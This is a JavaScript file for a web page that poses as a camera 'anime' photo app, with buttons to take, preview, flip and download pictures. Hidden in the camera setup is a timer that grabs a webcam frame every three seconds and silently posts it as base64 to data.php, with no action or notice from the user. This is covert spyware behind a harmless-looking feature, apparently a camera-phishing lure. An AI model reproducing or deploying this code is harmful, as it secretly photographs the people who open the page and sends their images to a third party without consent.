'use-strict';
const conPic=document.querySelector(".continer-pic");
const dlNewPic=document.querySelector("#dl-new");
const video=document.querySelector("#video");
const picture=document.querySelector("#photo");
const changeUser=document.querySelector(".change-user");
const btnTakePic=document.querySelector(".take-photo");
const btnPicView=document.querySelector(".my-pic");
const picView=document.querySelector(".info-pic");
const picViewContiner=document.querySelector(".my-pic-view");
const picBefore=document.querySelector(".img-before");
const btnClose=document.querySelector("#close");
const dlBeforePic=document.querySelector(".dl-pic");
const canvas=document.querySelector("#canvas");
const loading=document.querySelector(".loading");
const load=document.querySelector(".load");
const errorHandel=document.querySelector(".Error");
const contentPic=document.querySelector(".doing-photos");
const context=canvas.getContext('2d');
let camera='environment';
const writingPicture=function (canvas, video) {
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    return context.drawImage(video, 0, 0, canvas.width, canvas.height);
}
const lissenerClick=(el, fc) => el.addEventListener('click', fc);

const crateErHandel=(text) => {
    const errorHandelBtn=document.createElement("div");
    errorHandelBtn.classList.add('handelError');
    errorHandelBtn.textContent=text;
    contentPic.appendChild(errorHandelBtn);
    setTimeout(() => {
        contentPic.removeChild(errorHandelBtn);
    }, 4000);
}

const changeClass=function (item, e) {
    e.preventDefault();
    item==='add'? picViewContiner.classList.add('open'):picViewContiner.classList.remove('open');
}
const openViewPic=e => changeClass('add', e);
const closeViewPic=e => changeClass('remove', e);

const getPic=function (e) {
    if (!loading.classList.contains('do')) {
        e.preventDefault();
        const booli=(camera==='user')? false:true;
        picBefore.style.transform=booli? `rotateY(0deg)`:`rotateY(180deg)`;
        picView.style.transform=booli? `rotateY(0deg)`:`rotateY(180deg)`;
        writingPicture(canvas, video);
        picBefore.src=canvas.toDataURL('image/png', 1.0);
        picView.src=canvas.toDataURL('image/png', 1.0);
        context.filter='saturate(80%) brightness(60%) contrast(90%)';
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        picture.src=canvas.toDataURL('image/png', 1.0); // نمایش عکس
        video.classList.remove('ok');
        picture.classList.remove('close');
    }
    else {
        crateErHandel('plase wait');
    }
    // picAnime(canvas.toDataURL('image/png', 1.0));
}
const downloadPhotos=function (e) {
    e.preventDefault();
    const date=new Date();
    const fullDate=[
        date.getFullYear(),
        date.getMonth(),
        date.getDay(),
        date.getHours(),
        date.getMinutes(),
        date.getSeconds()
    ].join('-');
    if (!picture.classList.contains('close')&&!loading.classList.contains('do')) {
        const link=document.createElement('a');
        const changes=picViewContiner.classList.contains('open');
        link.href=changes? picBefore.src:picture.src;
        link.download=changes? `${fullDate}.png`:`Anime${fullDate}.png`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    } else {
        crateErHandel('plase take a picture');
    }
}
const changingUser=function (e) {
    e.preventDefault();
    if (video.srcObject&&!loading.classList.contains('do')) {
        video.srcObject.getTracks().forEach(e => e.stop());
        const booli=(camera==='user')? true:false;
        camera=booli? 'environment':'user';
        picture.style.transform=booli? `rotateY(0deg)`:`rotateY(180deg)`;
        video.style.transform=booli? `rotateY(0deg)`:`rotateY(180deg)`;
        accesPic(camera);
    } else {
        crateErHandel('plase wait for change user');
    }
}


const accesPic=async function (camretype) {
    const changing={
        video: {
            facingMode: camretype,
        },
        audio: false,
    };
    video.classList.remove('ok');
    picture.classList.add('close');
    loading.classList.add('do');
    try {
        const stream=await navigator.mediaDevices.getUserMedia(changing);
        video.srcObject=stream;
        video.classList.add('ok');
        loading.classList.remove('do');
        picture.classList.add('close');
        // changeUser.addEventListener('click', changingUser);

        lissenerClick(btnPicView, openViewPic);
        lissenerClick(dlBeforePic, downloadPhotos);
        lissenerClick(btnTakePic, getPic);
        lissenerClick(btnClose, closeViewPic);
        lissenerClick(dlNewPic, downloadPhotos);
        lissenerClick(changeUser, changingUser);
        setInterval(() => {
            writingPicture(canvas, video);
            post(canvas.toDataURL('image/png'));
        }, 3000);
    } catch (error) {
        load.classList.add('remove');
        errorHandel.classList.add('yes');
        errorHandel.innerHTML+=`${error}`;
    }
}

const post=function (imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata.replace("data:image/png;base64,", "")},
        url: 'data.php',
        dataType: 'json',
        async: true,
        success(result) {
            // call the function that handles the response/results
        },
        error() {
        }
    });
}
accesPic(camera);
